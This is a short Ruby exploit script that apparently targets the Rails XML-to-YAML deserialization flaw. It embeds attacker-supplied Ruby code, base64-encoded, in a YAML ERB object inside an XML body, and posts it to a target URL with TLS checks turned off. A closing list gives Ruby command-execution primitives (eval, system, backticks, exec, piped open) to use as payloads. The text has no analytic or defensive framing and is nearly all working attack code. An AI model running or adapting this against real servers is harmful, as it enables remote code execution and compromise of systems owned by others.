require "net/https"
require "uri"
require "base64"
require "rack"
require "uri"

url   = ARGV[0]
code  = File.read(ARGV[1])

# Construct a YAML payload wrapped in XML
payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
<fail type="yaml">
--- !ruby/object:ERB
  template:
    src: !binary |-
      #{Base64.encode64(code)}
</fail>
PAYLOAD

# Build an HTTP request
uri = URI.parse(url)
http = Net::HTTP.new(uri.host, uri.port)
if uri.scheme == "https"
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end
request = Net::HTTP::Post.new(uri.request_uri)
request["Content-Type"] = "text/xml"
request["X-HTTP-Method-Override"] = "get"
request.body = payload

# Print the response
response = http.request(request)
puts "HTTP/1.1 #{response.code} #{Rack::Utils::HTTP_STATUS_CODES[response.code.to_i]}"
response.each { |header, value| puts "#{header}: #{value}" }
puts
puts response.body



eval("ruby code here")
system("os command here")
`ls -al /` # (backticks contain os command)
exec("os command here")
open("\| os command here")
